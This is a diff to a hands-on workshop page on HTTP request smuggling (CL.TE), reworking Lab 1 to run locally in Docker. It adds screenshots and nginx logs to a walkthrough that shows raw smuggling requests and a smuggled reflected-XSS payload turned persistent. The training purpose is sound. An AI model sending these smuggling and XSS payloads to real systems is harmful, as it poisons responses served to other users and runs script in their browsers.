@@ -150,10 +150,11 @@ Conference!\r\n
       </google-codelab-step>
     
       <google-codelab-step label="LAB 1: HTTP/1.1 CL.TE" duration="20">
-        <p>For this first lab, you will need to add the following entry to your <code>hosts</code> file (<code>/etc/hosts</code> or <code>c:\windows\system32\drivers\etc\hosts</code>).</p>
-<pre><code>127.0.0.1 simplewebsite.gosec.co
+        <p>For this first lab, you need to launch the application using the following commands:</p>
+<pre><code>&gt; cd 01_http1_clte
+&gt; docker-compose up
 </code></pre>
-<p>Open <code>http://simplewebsite.gosec.co</code> in a browser to confirm that everything is running.</p>
+<p>Open <code>http://localhost</code> in a browser to confirm that everything is running.</p>
 <h2 is-upgraded>HRS detection</h2>
 <p>The following request needs to repeated ~10 times until you get <code>405 Not Allowed</code> (Method not allowed).</p>
 <pre><code>POST / HTTP/1.1
@@ -168,14 +169,18 @@ G
 <aside class="warning"><p><strong>Note:</strong> We need to repeated the following request multiple times. It is the result of connection pool usage between the proxy and the backend. There is more than one connection that are kept alive.</p>
 </aside>
 <h2 is-upgraded>Finding a XSS vector</h2>
-<p>There are two main vectors to execute Javascript on a system vulnerable to HRS.</p>
+<p>There are two main vectors that can be used to execute Javascript on a system vulnerable to HRS.</p>
 <ol type="1">
-<li>Causing an open-redirect to a malicious Javascript file.</li>
+<li>Causing an Open Redirect to a malicious Javascript file.</li>
 <li>Transforming a reflected XSS in a persistent XSS.</li>
 </ol>
 <p>The first vector aims at highjacking the response intended for a request to a JavaScript resource while the second one is targeting requests to HTML pages.</p>
-<h2 is-upgraded>From limited to persistent XSS</h2>
-<p>Injecting an HTTP request in the proxy pipeline.</p>
+<h2 is-upgraded>From reflected to persistent XSS</h2>
+<p>First, we can see that the query string is reflected to the action attribute of the contact form. This is something promising for Cross-Site Scripting. However, we can observe that the query string is not URL decoded in the page and modern browsers will encode special characters automatically.</p>
+<p class="image-container"><img alt="Query string reflected in the HTML" src="img\\45b71f385c888f08.gif"></p>
+<p>If we send a decoded value to the server, we can see that it is reflected without any escaping.</p>
+<p class="image-container"><img alt="Burp repeater reflected value" src="img\\951f1d0f924719b1.png"></p>
+<p>Because we have confirm that HRS is possible, the next step is to injecting an HTTP request with the reflected XSS in the proxy pipeline. If the proxy only consider <code>Content-Length: 79</code> and the backend supports chunked encoding, than the backend will see two requests instead of one. (See payload below)</p>
 <pre><code>POST / HTTP/1.1
 Host: simplewebsite.gosec.co
 Content-Length: 79
@@ -186,7 +191,19 @@ Transfer-Encoding: chunked
 GET /contact.php?test=123&#34;&gt;&lt;img/src=&#34;xx&#34;onerror=&#34;alert(1)&#34;&gt; HTTP/1.1
 Foo:
 </code></pre>
-<p>Once this is sent. Refresh the home page or any page on the website until it is placed after the previous malicious request. You should see the XSS trigger. </p>
+<p>Once this is sent. Refresh the home page or any page on the website until it is placed after the previous malicious request.</p>
+<p>You should see the XSS trigger.</p>
+<p class="image-container"><img alt="XSS alert trigged" src="img\\bf7533174bb07548.png"></p>
+<aside class="special"><p><strong>Note:</strong> The request page by the victim was the home page but, the render page is the contact page with the XSS. Any page would have trigged the XSS.</p>
+</aside>
+<p>The docker log can confirm that the backend (here nginx server) is seeing a POST and a GET request.</p>
+<pre><code>nginx_1  | 172.20.0.4 - - [01/Dec/2021:18:40:04 +0000] &#34;POST / HTTP/1.1&#34; 200 1930 &#34;-&#34; &#34;-&#34; &#34;172.20.0.1&#34;
+nginx_1  | 172.20.0.4 - - [01/Dec/2021:18:40:10 +0000] &#34;GET /contact.php?test=123\x22&gt;&lt;img/src=\x22xx\x22onerror=\x22alert(1)\x22&gt; HTTP/1.1&#34; 408 0 &#34;-&#34; &#34;-&#34; &#34;-&#34;
+[...]
+nginx_1  | 172.20.0.4 - - [01/Dec/2021:18:40:18 +0000] &#34;GET / HTTP/1.1&#34; 200 1930 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&#34; &#34;172.20.0.1&#34;
+nginx_1  | 172.20.0.4 - - [01/Dec/2021:18:41:27 +0000] &#34;GET / HTTP/1.1&#34; 200 1930 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&#34; &#34;172.20.0.1&#34;
+nginx_1  | 172.20.0.4 - - [01/Dec/2021:18:41:29 +0000] &#34;GET / HTTP/1.1&#34; 200 1930 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&#34; &#34;172.20.0.1&#34;
+</code></pre>
 
 
       </google-codelab-step>
